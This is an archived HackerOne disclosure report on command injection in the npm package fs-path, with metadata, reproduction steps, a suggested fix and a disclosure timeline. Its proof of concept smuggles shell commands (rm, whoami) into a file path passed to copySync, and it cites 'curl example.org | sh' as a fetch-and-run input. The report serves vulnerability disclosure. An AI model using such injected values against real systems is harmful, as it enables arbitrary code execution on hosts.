---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/node
  - vuln/command-injection
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2018-05-11
submitted: 2018-03-11T20:19:23.918Z
bounty_usd: null
votes: 2
cve: "CVE-2020-8298"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "chalker"
source: "https://hackerone.com/reports/324491"
title: "`fs-path` concatenates unsanitized input into exec()/execSync() commands"
---
# `fs-path` concatenates unsanitized input into exec()/execSync() commands

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 2 | **Program:** Node.js third-party modules | **Disclosed:** 2018-05-11

- Report: [https://hackerone.com/reports/324491](https://hackerone.com/reports/324491)
- CWE: Command Injection - Generic | CVE: CVE-2020-8298
- Submitted: 2018-03-11T20:19:23.918Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report command injection in `fs-path`.
It allows to inject and execute arbitrary shell commands while performing various operations from `fs-path` API like copying files.

# Module

**module name:** `fs-path`
**version:** 0.0.24
**npm page:** `https://www.npmjs.com/package/fs-path`

## Module Description

> Useful file utitiles.

## Module Stats

108 downloads in the last day
2 916 downloads in the last week
13 186 downloads in the last month

# Vulnerability

## Vulnerability Description

Arguments are not properly escaped before being concatenated into the command that is passed to `exec()`/`execSync()`.

 See https://github.com/pillys/fs-path/blob/master/lib/index.js

## Steps To Reproduce:

```js
const fsPath = require('fs-path');
const source = '/bin/ls';
const target =  '/tmp/foo;rm\t/tmp/foo;whoami>\t/tmp/bar';
fsPath.copySync(source, target);
```

Observe `/tmp/bar` being created with `whoami` output.

The same issue affects other methods in `fs-path` API, not just `copySync`.

## Patch

The suggested fix is to avoid using `exec`/`execSync` and instead pass parameters as an array of arguments to corresponding `child_process` methods.

## Supporting Material/References:

* Arch Linux current
* Node.js 9.7.1
* npm 5.7.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

For setups where user input could end up in arguments of calls to `fs-wrap` API (like filename etc), users would be able to execute arbitrary shell commands.

Note that sanitization of user input on the application side might not prevent this issue, as simple path sanitization that removes stuff `/` and `..` is not enough — commands like `curl example.org | sh` might pass through sanitization of user input (like filenames etc.) on the application side.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2018-03-12** @lirantal: Hi,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **2018-04-24** @lirantal: @chalker due to no activity from the maintainer, how do you feel about disclosing this report?
- **2018-05-11** @chalker: I'm fine with the disclosure.

Depsdb output:
```
Query: "fs-path@
10211   fs-path
2343    gulp-version-number
1200    gulp-axe-webdriver
886     font-plugins-plus
645     jdfx
…
```
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **Changed Scope**
